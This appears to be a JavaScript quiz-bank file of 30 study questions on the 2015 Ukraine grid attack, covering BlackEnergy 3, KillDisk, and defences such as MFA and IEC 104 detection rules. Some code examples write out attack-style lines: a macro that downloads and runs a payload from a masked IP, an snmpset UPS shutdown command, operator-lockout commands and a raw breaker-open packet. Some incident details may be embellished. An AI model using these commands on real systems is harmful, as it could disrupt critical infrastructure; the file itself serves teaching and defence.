// topic4_questions.js
// 30 Comprehensive Questions on Case Study 4: Ukraine Power Grid Attack (2015) - BlackEnergy and SCADA Disruption

const questions = [
  {
    id: 1,
    question: "Why is the December 23, 2015 Ukraine power grid cyber attack historic in the history of critical infrastructure security?",
    shortAnswer: "It was the first publicly acknowledged cyber attack that successfully caused a widespread physical electrical power blackout, disconnecting ~230,000 citizens.",
    explanation: "At 3:30 PM on December 23, 2015, operators at the Prykarpattyaoblenergo regional power distribution company in western Ukraine watched helplessly as their mouse cursors moved autonomously across their screens, clicking and opening substation circuit breakers one by one. Over 30 substations were taken offline, plunging 230,000 residents into darkness in sub-zero winter temperatures.",
    hint: "The world's first cyber attack that physically disconnected an electrical power grid.",
    level: "Moderate",
    codeExample: `// Attack Impact Summary (December 23, 2015):
const ukraine2015Blackout = {
  impactedUtilities: ["Prykarpattyaoblenergo", "Kyivoblenergo", "Chernivtsioblenergo"],
  substationsTakenOffline: 30,
  citizensWithoutPower: 230000,
  durationHours: 6,
  threatActor: "Sandworm Team (Russian Military Intelligence GRU / Unit 74455)"
};`
  },
  {
    id: 2,
    question: "Which threat actor was attributed with orchestrating the 2015 Ukraine power grid cyber assault?",
    shortAnswer: "The Sandworm Team (also known as Unit 74455 of the Russian GRU / Main Intelligence Directorate).",
    explanation: "Sandworm is an elite Russian military cyber warfare unit specializing in critical infrastructure sabotage. They were also responsible for the 2016 Ukraine 'Industroyer/CrashOverride' blackout, the 2017 NotPetya global wiper outbreak, and attacks on the 2018 PyeongChang Winter Olympics.",
    hint: "Sandworm Team (Russian GRU military cyber warfare unit).",
    level: "Moderate",
    codeExample: `// Threat Actor Profile:
const sandWormProfile = {
  names: ["Sandworm Team", "Unit 74455", "Voodoo Bear", "TeleBots", "BlackEnergy APT"],
  organization: "GRU (Main Directorate of the General Staff of the Armed Forces of the Russian Federation)",
  specialty: "Critical Infrastructure Sabotage (OT/ICS/SCADA) and Destructive Wipers"
};`
  },
  {
    id: 3,
    question: "What initial access vector did Sandworm use to penetrate the Ukrainian electrical distribution networks?",
    shortAnswer: "Spear-phishing emails containing malicious Microsoft Word documents with VBA macros dropping the BlackEnergy 3 malware.",
    explanation: "Employees received emails disguised as official energy tariff updates. The documents prompted users to 'Enable Content' to view macros. Once enabled, the VBA code dropped a dropper binary that fetched and installed BlackEnergy 3 (a modular backdoor trojan), giving attackers remote shell access inside the corporate IT network.",
    hint: "Spear-phishing emails with weaponized Word macros delivering BlackEnergy 3.",
    level: "Moderate",
    codeExample: `// VBA Macro Dropper Pseudo-Code:
// Sub AutoOpen()
//   Dim payloadUrl As String
//   payloadUrl = "http://5.9.xxx.xxx/update/vky.exe"
//   DownloadAndExecute(payloadUrl, "C:\\Users\\Public\\svchost.exe")
// End Sub`
  },
  {
    id: 4,
    question: "How did attackers cross from the corporate IT business network into the sensitive Operational Technology (OT) SCADA network?",
    shortAnswer: "Through a Virtual Private Network (VPN) connecting the IT and SCADA networks, using stolen valid employee credentials that lacked Multi-Factor Authentication (MFA).",
    explanation: "The utility had implemented a VPN barrier between the corporate IT subnet and the SCADA control network. However, the VPN only required a static username and password. After harvesting domain credentials on the IT side with keyloggers, attackers authenticated directly into the SCADA control room network without triggering alarms.",
    hint: "VPN gateway lacking Multi-Factor Authentication accessed via stolen IT credentials.",
    level: "Moderate",
    codeExample: `// IT-to-OT Boundary Breach:
const vpnGateway = {
  sourceNetwork: "Corporate IT Subnet (Compromised via BlackEnergy 3)",
  destinationNetwork: "OT / SCADA Substation Control Subnet",
  authenticationMethod: "Single-Factor Password Only (NO MFA)",
  result: "Adversary gained direct Remote Desktop (RDP) access to HMI workstations"
};`
  },
  {
    id: 5,
    question: "What was the role of the 'KillDisk' component in the Ukraine power grid attack?",
    shortAnswer: "A destructive wiper that erased master boot records, corrupted disk sectors, and specifically targeted and deleted industrial SCADA control software services.",
    explanation: "KillDisk was deployed in the final stage to maximize blackout duration. It wiped Master Boot Records, deleted configuration databases, and destroyed the executable files of the SCADA software (`ELPROS`, `OASyS`). This blinded operators and prevented them from using their computer screens to restore power.",
    hint: "Destructive disk wiper that destroyed SCADA operator workstation software and MBRs.",
    level: "Expert",
    codeExample: `// KillDisk Industrial Software Targeting Loop:
const targetedScadaProcesses = [
  "elpros.exe",   // Ukrainian SCADA Master System
  "secsrv.exe",   // Security & Remote Control Service
  "servus.exe",   // Substation Communication Daemon
  "asdu.exe"      // Telemetry Data Unit Handler
];
// KillDisk terminated these processes, deleted their executables, and wiped raw disk sectors.`
  },
  {
    id: 6,
    question: "How did the attackers prevent Ukrainian engineers from remotely closing the circuit breakers to restore electricity?",
    shortAnswer: "They flashed corrupted, malicious firmware onto the serial-to-Ethernet converters, permanently severing communications between the control room and field substations.",
    explanation: "Field substations rely on serial-to-Ethernet bridge devices (such as MOXA converters) to translate Ethernet commands from the central control room into serial commands (IEC 60870-5-104 / DNP3) for physical breakers. Attackers uploaded corrupted, unrecoverable firmware to these devices, permanently bricking them and forcing utility workers to manually drive to every remote substation.",
    hint: "Flashing corrupt firmware onto serial-to-Ethernet converters to destroy remote telemetry.",
    level: "Expert",
    codeExample: `// Malicious Firmware Overwrite (Moxa / Serial Converter):
// Attackers sent a raw TCP firmware upload packet containing garbage bytes:
// Converter accepted the unsigned firmware update, wiped its EEPROM, and bricked permanently.
// Result: Central SCADA could no longer send remote "CLOSE_BREAKER" commands!`
  },
  {
    id: 7,
    question: "What is a 'Telephony Denial of Service' (TDoS) attack, and how was it synchronized during the blackout?",
    shortAnswer: "Flooding the utility's customer call centers with thousands of automated fake phone calls, preventing real citizens from reporting outages and blinding dispatchers.",
    explanation: "Simultaneously with opening the circuit breakers, attackers launched a massive automated VoIP flooding campaign against Prykarpattyaoblenergo's customer support numbers. Call center lines were continuously jammed with automated prerecorded Russian audio, preventing desperate citizens from reporting blackout locations.",
    hint: "Automated phone call flood jamming customer call centers during the blackout.",
    level: "Moderate",
    codeExample: `// Telephony DoS (TDoS) Flooding Architecture:
// VoIP SIP Botnet ---> Generates 5,000 automated calls/min to +380-342-59-xxxx
// Customer Call Center PBX overloaded ---> Real human dispatchers unable to receive outage reports`
  },
  {
    id: 8,
    question: "What role did Uninterruptible Power Supply (UPS) sabotage play in the attack?",
    shortAnswer: "Attackers remotely reprogrammed the central control room's UPS backup units to disconnect battery power during the blackout, plunging the control room itself into pitch darkness.",
    explanation: "To induce psychological panic among utility staff, attackers accessed the management interfaces of the APC/Schneider UPS systems powering the central dispatch center. When the main grid went down, the attackers sent commands to discharge and shut down the UPS, turning off all emergency lights and computer monitors inside the control room.",
    hint: "Remotely disabling control room UPS battery units to plunge dispatchers into darkness.",
    level: "Expert",
    codeExample: `// UPS Network Management Card Command:
// snmpset -v1 -c private 10.20.1.100 .1.3.6.1.4.1.318.1.1.1.6.2.1.0 i 3
// (Sends SNMP command to initiate immediate UPS battery shutdown and drop load)`
  },
  {
    id: 9,
    question: "How did Ukrainian electrical utility operators successfully restore power within 6 hours despite all computer systems being destroyed?",
    shortAnswer: "By dispatching field crews in trucks to manually operate physical mechanical levers and switches at every substation across the frozen province.",
    explanation: "Because the Ukrainian grid maintained legacy mechanical manual controls (unlike modern fully automated Western grids), engineers physically drove to each of the 30+ dark substations in sub-zero snowstorms and used manual hand-cranks and levers to close the circuit breakers, restoring power manually within 6 hours.",
    hint: "Physically driving to substations to manually throw mechanical switches and hand-cranks.",
    level: "Moderate",
    codeExample: `// Manual Grid Recovery Mode:
const manualRecoveryProtocol = {
  scadaMode: "OFFLINE / BRICKED",
  dispatchMethod: "Field technicians in 4x4 trucks dispatched to 30 substation sites",
  operation: "Manual mechanical breaker closure via physical hand-cranks",
  durationToFullRestoration: "6 Hours"
};`
  },
  {
    id: 10,
    question: "What industrial communication protocols were utilized by the central SCADA software to control substations in Ukraine?",
    shortAnswer: "IEC 60870-5-104 (telecontrol over TCP/IP), IEC 60870-5-101 (serial), and Modbus.",
    explanation: "European and Ukrainian electrical grids primarily communicate using the IEC 60870-5 standard suite. These legacy protocols were designed without built-in encryption or authentication, meaning that any computer inside the OT subnet could send valid 'Open Breaker' command packets that substations were forced to obey.",
    hint: "IEC 60870-5-104 and IEC 60870-5-101 industrial telemetry protocols.",
    level: "Moderate",
    codeExample: `// IEC 60870-5-104 ASDU Command (Open Circuit Breaker):
// Byte sequence for Single Command (C_SC_NA_1, TypeID 45):
// [0x68, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x2D, 0x01, 0x06, 0x00, 0x01, 0x00, 0x05, 0x00, 0x00, 0x01]
// Transmitted in unencrypted cleartext across OT network!`
  },
  {
    id: 11,
    question: "What is 'Industroyer' (also known as 'CrashOverride') and how did it evolve in the second Ukraine blackout of December 2016?",
    shortAnswer: "The first dedicated malware framework with built-in modules designed specifically to speak industrial electrical protocols (IEC 60870-5-104, IEC 61850, OPC DA) automatically without human GUI interaction.",
    explanation: "In the 2015 attack, attackers had to manually click the mouse on HMI screens to open breakers. In the December 2016 Kyiv blackout, Sandworm deployed 'Industroyer', a fully automated malware payload containing dedicated protocol parsers that directly transmitted IEC 104 and IEC 61850 packets to open breakers in milliseconds.",
    hint: "An automated malware framework with native protocol parsers for IEC 60870-5-104 and IEC 61850.",
    level: "Expert",
    codeExample: `// Industroyer Modular Architecture:
const industroyerModules = [
  "104.dll → Protocol payload for IEC 60870-5-104",
  "61850.dll → Protocol payload for IEC 61850 (Substation Automation)",
  "opc.dll → Protocol payload for OPC Data Access (DA)",
  "101.dll → Protocol payload for IEC 60870-5-101 (Serial links)",
  "wiper.exe → Destructive disk wiper for anti-forensics"
];`
  },
  {
    id: 12,
    question: "Why is 'Multi-Factor Authentication' (MFA) on all IT/OT VPN access points the most critical preventive control identified by post-mortems?",
    shortAnswer: "Because Sandworm's entire lateral pivot into the SCADA network depended on reusing stolen plaintext passwords over a single-factor VPN gateway.",
    explanation: "If Prykarpattyaoblenergo had enforced hardware FIDO2 or TOTP multi-factor authentication on their IT/OT jump-box VPNs, the stolen credentials harvested by BlackEnergy 3 would have been useless, halting the attack before it ever reached the SCADA control room.",
    hint: "Universal MFA on all VPN gateways prevents stolen passwords from crossing IT/OT boundaries.",
    level: "Moderate",
    codeExample: `// Hardened IT/OT Jump-Box Access Policy:
const scadaVpnPolicy = {
  ingressGateway: "FortiGate / Cisco ZTNA Bastion",
  allowedSources: ["Secured SOC Terminals with Valid Device Certificates"],
  mfaRequirement: "FIDO2 Hardware Key (YubiKey / Passkey) REQUIRED",
  sessionTimeoutMinutes: 15,
  protocolInspection: "Full RDP/SSH Session Recording & Deep Packet Inspection"
};`
  },
  {
    id: 13,
    question: "What is 'Out-of-Band Firmware Verification' and how does it prevent the permanent bricking of serial converters?",
    shortAnswer: "Requiring firmware updates to be physically applied via local console cables with cryptographic RSA signature verification, rather than over remote network connections.",
    explanation: "Attackers exploited the ability to flash unauthenticated firmware over the network (TCP Port 80/23). Securing field devices requires disabling remote network firmware upgrades and enforcing hardware cryptographic verification on boot.",
    hint: "Disabling remote network firmware updates and mandating signed firmware via console cables.",
    level: "Moderate",
    codeExample: `// Secure Firmware Flashing Configuration (Serial Converter):
const moxaSecurityConfig = {
  remoteFirmwareUpdateOverEthernet: "DISABLED",
  serialConsoleAuth: "ENABLED_STRONG_PASS",
  cryptographicSignatureCheck: "RSA-4096 Vendor Root of Trust Required"
};`
  },
  {
    id: 14,
    question: "How did Sandworm maintain persistence on Ukrainian corporate IT networks for six months prior to the blackout?",
    shortAnswer: "Using BlackEnergy 3 plugins that installed scheduled tasks, modified local service registry keys, and established redundant encrypted SSL C2 beacon channels.",
    explanation: "Between May 2015 and December 2015, the attackers conducted extensive internal reconnaissance. They used BlackEnergy plugins (`dstr`, `si`, `graber`) to harvest credentials, map network routes, and identify SCADA operator schedules without triggering alarms.",
    hint: "Modular BlackEnergy 3 plugins establishing scheduled tasks and encrypted SSL C2 channels.",
    level: "Expert",
    codeExample: `// BlackEnergy 3 Modular Plugin Architecture:
const blackEnergyPlugins = [
  { plugin: "graber.dll", function: "Extracts cached Outlook credentials and certificates" },
  { plugin: "si.dll",     function: "System Information enumeration (OS, patch, network)" },
  { plugin: "dstr.dll",   function: "Disk destructive wiper payload (Early KillDisk)" },
  { plugin: "rdp.dll",    function: "Enables hidden Remote Desktop accounts" }
];`
  },
  {
    id: 15,
    question: "What is 'Protocol Anomaly Detection' in an electrical SCADA network and how does it detect rogue breaker commands?",
    shortAnswer: "Monitoring industrial protocol traffic (IEC 104) and triggering alarms if an abnormal burst of 'Open Breaker' commands is sent during peak hours without operator authorization.",
    explanation: "In an electrical distribution grid, circuit breakers are opened rarely (e.g. for scheduled maintenance). A Network Intrusion Detection System (NIDS) like Zeek or Nozomi inspecting IEC 104 traffic identifies a sequence of 30 simultaneous breaker open commands as a critical cyber-physical anomaly.",
    hint: "Baseline monitoring alerting on sudden, abnormal bursts of breaker disconnection commands.",
    level: "Expert",
    codeExample: `// Snort / Suricata Rule for Rapid IEC 104 Breaker Disconnect:
alert tcp any any → any 2404 (
  msg:"SCADA-CRITICAL: Rapid IEC 60870-5-104 Breaker Open Command Detected";
  content:"|68|"; offset:0; depth:1;
  content:"|2D|"; offset:6; depth:1; // TypeID 45 (Single Command)
  threshold: type both, track by_src, count 5, seconds 60;
  sid:9000201; rev:1;
)`
  },
  {
    id: 16,
    question: "How did the attackers utilize 'VNC / RDP Hijacking' to lock out human operators during the attack?",
    shortAnswer: "They changed the Windows operator account passwords in real-time, killed operator sessions, and revoked administrative access so staff could not intervene.",
    explanation: "As operators watched their screens being manipulated via remote desktop, they grabbed their physical mice to fight for control. The attackers immediately terminated the operator's local session, locked the screen, and rotated the Windows account passwords, completely locking human engineers out of their own workstations.",
    hint: "Rotating passwords and terminating local operator sessions in real-time.",
    level: "Moderate",
    codeExample: `// Attacker Real-Time Operator Lockout:
// net user operator Password@Reset#999
// logoff 1
// tscon 2 /dest:console`
  },
  {
    id: 17,
    question: "What role does 'Air-Gapped Engineering Station Isolation' play in electrical substation defense?",
    shortAnswer: "Ensuring that the computers capable of re-programming protective relays and RTUs have zero logical connection to business IT or internet-connected jump boxes.",
    explanation: "Protective relays (SEL, ABB, Siemens) must be isolated on an engineering network that cannot be reached by corporate IT. If engineering stations are physically segregated, remote attackers cannot rewrite relay trip logic or corrupt converter firmware.",
    hint: "Isolating relay programming terminals from all corporate IT and internet networks.",
    level: "Moderate",
    codeExample: `// Purdue Model Level 1/2 Isolation for Protective Relays:
// Corporate IT (Level 4) -x- AIR-GAP / BASTION (Level 3) -x- Substation Relays (Level 1)`
  },
  {
    id: 18,
    question: "What is 'C2 Infrastructure Diversity' and how did Sandworm conceal its command servers?",
    shortAnswer: "Using bulletproof hosting providers, dynamic DNS domains, and compromised WordPress websites across multiple European nations as multi-hop proxy nodes.",
    explanation: "BlackEnergy 3 beaconed to command servers hosted in Germany, Russia, Latvia, and Ukraine. Attackers used fast-flux DNS and encrypted HTTPS/SSL channels, masquerading C2 communication as benign web traffic to avoid perimeter firewall blocking.",
    hint: "Distributing C2 servers across compromised WordPress sites and multi-hop global proxies.",
    level: "Moderate",
    codeExample: `// BlackEnergy 3 C2 Network Fingerprint:
const c2Endpoints = [
  "https://5.9.xxx.xxx:443/xml/update.php",
  "https://194.58.xxx.xxx:443/news/index.php"
];`
  },
  {
    id: 19,
    question: "What critical lesson does the Ukraine 2015 attack teach Western and Indian electrical utilities regarding 'Complete Digital Automation'?",
    shortAnswer: "Preserving manual, mechanical analog override capabilities is vital; a 100% digitally automated grid without manual hand-cranks cannot recover if software is wiped.",
    explanation: "If the Ukrainian grid had been 100% digitized without physical levers (as many modern Western and Indian smart grids are designed), the blackout would have lasted for months while utility companies waited for replacement serial converters from international factories. Manual failovers saved Ukraine.",
    hint: "Maintaining manual mechanical failovers ensures recovery even when digital systems are bricked.",
    level: "Moderate",
    codeExample: `// Golden Rule of Electrical Grid Resilience:
const gridResilienceRule = {
  digitalAutomation: "Provides efficiency and real-time remote telemetry in peacetime",
  analogManualOverride: "Mandatory survival mechanism when digital control plane is destroyed"
};`
  },
  {
    id: 20,
    question: "How does the Indian Central Electricity Authority (CEA) Cyber Security Guidelines (2021) mandate protection for power utilities in West Bengal and India?",
    shortAnswer: "Mandates isolation of Critical Information Infrastructure (CII), strict IT/OT air-gaps, hardware firewalls, regular vulnerability assessments, and CERT-In reporting.",
    explanation: "Under the CEA (Cyber Security in Power Sector) Guidelines, Indian electrical utilities (e.g. WBSEDCL, CESC in Kolkata and Barrackpore) must designate Chief Information Security Officers (CISOs), maintain isolated OT subnets, enforce FIDO2 MFA, and conduct mandatory bi-annual security audits.",
    hint: "CEA Guidelines mandating IT/OT isolation, hardware firewalls, and bi-annual security audits.",
    level: "Moderate",
    codeExample: `// CEA Cyber Security Compliance Checklist (India):
const ceaPowerCompliance = {
  statute: "CEA (Technical Standards for Cyber Security in Power Sector) Guidelines",
  mandatoryControls: [
    "Strict isolation of SCADA / EMS networks from Corporate IT",
    "Deployment of Industrial Protocol Firewalls (IEC 104 / DNP3 Deep Packet Inspection)",
    "Prohibition of remote internet connections to substation protective relays",
    "Mandatory reporting of cyber incidents to CERT-In and Power-CSIRT"
  ]
};`
  },
  {
    id: 21,
    question: "What is 'IEC 61850' and how does it improve substation automation compared to legacy serial protocols?",
    shortAnswer: "An international standard for substation automation that uses Ethernet-based GOOSE and MMS messaging, supporting modern TLS encryption and digital signatures.",
    explanation: "While legacy IEC 104 transmitted cleartext commands, modern IEC 61850 standardizes Generic Object Oriented Substation Events (GOOSE) over Ethernet. When combined with IEC 62351 security extensions, it mandates cryptographic message authentication, preventing spoofed breaker trip commands.",
    hint: "Modern Ethernet substation standard supporting GOOSE messaging and IEC 62351 cryptographic security.",
    level: "Expert",
    codeExample: `// IEC 62351 Security Extension for Substation Automation:
// IEC 62351-6 adds HMAC-SHA256 digital signatures to IEC 61850 GOOSE packets:
// Prevents adversaries from injecting unauthorized "OPEN_BREAKER" GOOSE messages!`
  },
  {
    id: 22,
    question: "What is 'Living-off-the-Land' in SCADA environments, and how did Sandworm abuse legitimate software tools during the attack?",
    shortAnswer: "Using the utility's own legitimate Remote Desktop (RDP) software, TeamViewer, and vendor administration utilities rather than noisy custom malware.",
    explanation: "Attackers did not need to develop custom exploits inside the OT network. They simply launched the utility's pre-installed Siemens and OASyS SCADA interfaces and clicked the standard GUI buttons to disconnect substations, making the activity appear like normal operator commands in system logs.",
    hint: "Abusing pre-installed remote desktop tools and SCADA GUI interfaces to open breakers.",
    level: "Moderate",
    codeExample: `// Legitimate SCADA Interface Abuse:
// Operator workstation had pre-installed VNC / RDP daemon
// Attacker authenticated via RDP session → Opened "Substation_Grid_Map.exe" → Clicked "DISCONNECT_ALL"`
  },
  {
    id: 23,
    question: "What role did 'Telephone Denial of Service' (TDoS) filtering play in subsequent utility emergency plans?",
    shortAnswer: "Deploying carrier-level SIP traffic rate-limiting, CAPTCHA IVR systems, and out-of-band mobile emergency notification channels for field engineers.",
    explanation: "Utilities now deploy automated voice firewalls (e.g. SecureLogix) that inspect incoming SIP call volumes, analyze calling patterns, challenge automated robotic callers, and prioritize authenticated emergency response lines.",
    hint: "Voice firewalls and carrier-level rate-limiting to prevent call center saturation.",
    level: "Moderate",
    codeExample: `// SIP Voice Firewall Rule:
/*
Rule: BLOCK_VOIP_CALL_FLOOD
Conditions:
  inbound_calls_per_minute: "> 500"
  caller_id: "ANONYMOUS / SPOOFED"
Action:
  divert_to_ivr_captcha: true
  whitelist_registered_emergency_numbers: true
*/`
  },
  {
    id: 24,
    question: "How did the attackers disable the utility's backup diesel generator systems during the incident?",
    shortAnswer: "By modifying the auxiliary substation power relays that fed electricity to the automated generator starter batteries.",
    explanation: "To prevent substations from automatically switching to local backup power, the attackers disconnected auxiliary station power feeds, draining the starter batteries and ensuring that automated transfer switches (ATS) could not start local backup generators.",
    hint: "Disconnecting auxiliary substation power feeds to prevent backup generators from starting.",
    level: "Expert",
    codeExample: `// Auxiliary Power Disconnect Sequence:
// Breaker 41 (Main Feed) → OPENED
// Breaker 42 (Station Auxiliary Backup / Battery Charger) → OPENED
// Result: Automated Transfer Switch (ATS) dead; diesel generator failed to crank`
  },
  {
    id: 25,
    question: "What is 'Chain of Custody' and how was forensic evidence preserved in the Ukraine power grid post-mortem?",
    shortAnswer: "Forensic teams imaged workstation hard drives, captured memory dumps from infected HMIs, collected PCAP network packet captures, and verified hashes (SHA-256).",
    explanation: "Investigators from SBU (Security Service of Ukraine), US DHS ICS-CERT, and Mandiant adhered to strict forensic standards. They isolated physical hard drives, generated cryptographic checksums, and safely reverse-engineered the KillDisk binaries in air-gapped sandboxes.",
    hint: "Cryptographic hashing, memory capture, and air-gapped sandbox reverse-engineering.",
    level: "Moderate",
    codeExample: `// Forensic Artifact Collection Log:
const ukraineEvidence = {
  evidenceTag: "EVID-KYIV-2015-1223-01",
  description: "Raw Disk Image of Substation HMI Operator PC",
  sha256: "8e7c12...f9a1",
  forensicTool: "FTK Imager / Volatility Memory Analysis",
  investigatingBody: "DHS ICS-CERT & SBU"
};`
  },
  {
    id: 26,
    question: "What is 'Behavioral Macro Analysis' in email gateways and how does it block BlackEnergy 3 attachments?",
    shortAnswer: "Sandboxing email attachments and executing them in a virtual machine to detect suspicious child processes (`cmd.exe`, `powershell.exe`) spawned by Office macros.",
    explanation: "Modern Secure Email Gateways (SEGs) do not rely on static signatures. When a Word document arrives, the SEG detonates it in a cloud sandbox. If the macro attempts to write an executable to `C:\\Users\\Public\\` or initiate an outbound HTTP request, the email is quarantined immediately.",
    hint: "Detonating macro attachments in a sandbox to detect unauthorized script execution.",
    level: "Moderate",
    codeExample: `// Secure Email Gateway Sandbox Rule:
// Trigger: Microsoft Word Document (.doc / .docm)
// If Document spawns child process matching ["cmd.exe", "powershell.exe", "wscript.exe"]
// Action: DROP_EMAIL & ALERT_SOC`
  },
  {
    id: 27,
    question: "What is 'Defense-in-Depth' in the context of electrical power substations?",
    shortAnswer: "Layering multiple independent security boundaries: perimeter firewalls, FIDO2 MFA, industrial IDS, signed firmware, and physical analog mechanical interlocks.",
    explanation: "No single defensive measure is foolproof. If phishing bypasses email security, MFA stops the VPN login; if the VPN is bypassed, protocol firewalls block rogue IEC 104 commands; if the SCADA is wiped, manual mechanical levers allow human recovery.",
    hint: "Multiple layered controls ensuring that if any single layer fails, the grid survives.",
    level: "Moderate",
    codeExample: `// 5-Layer Power Grid Defense Stack:
const powerGridDefenseStack = [
  "Layer 1: Email SEG Sandboxing (Blocks BlackEnergy macros)",
  "Layer 2: Zero Trust VPN Gateway (FIDO2 Hardware MFA on IT/OT boundary)",
  "Layer 3: SCADA Network NIDS (Deep Packet Inspection of IEC 60870-5-104)",
  "Layer 4: Hardened Protective Relays (Cryptographically signed firmware)",
  "Layer 5: Analog Mechanical Failsafes (Manual hand-cranks for physical breaker closure)"
];`
  },
  {
    id: 28,
    question: "Why did the 2015 Ukraine attack not cause permanent physical transformer explosions, unlike Stuxnet?",
    shortAnswer: "The attackers opened circuit breakers (disconnecting load) rather than causing dangerous over-voltage or over-current surges that physically burn out heavy substation transformers.",
    explanation: "Opening circuit breakers safely isolates the power lines. While it plunged citizens into darkness, the transformers themselves were not physically damaged. In contrast, Stuxnet physically destroyed centrifuge rotors. However, the 2016 Industroyer attack attempted to destroy protective relays to cause physical equipment damage.",
    hint: "Opening circuit breakers safely disconnects load without melting transformers.",
    level: "Expert",
    codeExample: `// Disconnection vs Physical Destruction:
const physicalImpactComparison = {
  stuxnet2010: "Physical kinetic destruction of 1,000 centrifuges via overspeed stress",
  ukraine2015: "Operational blackout caused by opening breakers; zero transformer destruction",
  industroyer2016: "Attempted physical transformer damage by blinding protective relays"
};`
  },
  {
    id: 29,
    question: "What role does 'Network Micro-segmentation' play inside substation control houses?",
    shortAnswer: "Isolating Human-Machine Interfaces (HMIs), serial converter gateways, and protective relays onto separate VLANs with strict firewall access rules.",
    explanation: "Even within a single substation building, the HMI terminal should not have unrestricted Layer 2 broadcast access to every relay. Micro-segmentation ensures that an infection on an HMI workstation cannot pivot across serial converters or tamper with substation automation controllers.",
    hint: "Isolating HMIs, serial converters, and protective relays on separate subnets within the substation.",
    level: "Moderate",
    codeExample: `// Substation Control House VLAN Segmentation:
// VLAN 100: Substation HMI Operator Workstation
// VLAN 200: Protective Relays (SEL / ABB / Siemens)
// VLAN 300: Serial-to-Ethernet Bridge Gateways (Moxa)
// Firewalled: HMI can ONLY send read queries to Relays, cannot write firmware!`
  },
  {
    id: 30,
    question: "What ultimate architectural lesson must electrical engineering and cybersecurity students in Barrackpore and Kolkata take from Ukraine 2015?",
    shortAnswer: "Never build a critical infrastructure network where an attacker with a stolen password can command physical disconnects without multi-factor authorization and manual analog safety nets.",
    explanation: "The Ukraine 2015 blackout proved that modern society's life-support systems (power, water, hospitals) can be shut down from thousands of miles away. Resilient engineering mandates Zero Trust, universal MFA, OT anomaly monitoring, and preserving manual physical controls.",
    hint: "Enforce Zero Trust, multi-factor authorization, and always maintain manual physical controls.",
    level: "Moderate",
    codeExample: `// The Golden Electrical Grid Security Formula:
// Security = (Zero Trust Architecture + FIDO2 MFA + Protocol DPI) * Manual Analog Resiliency`
  }
];

export default questions;
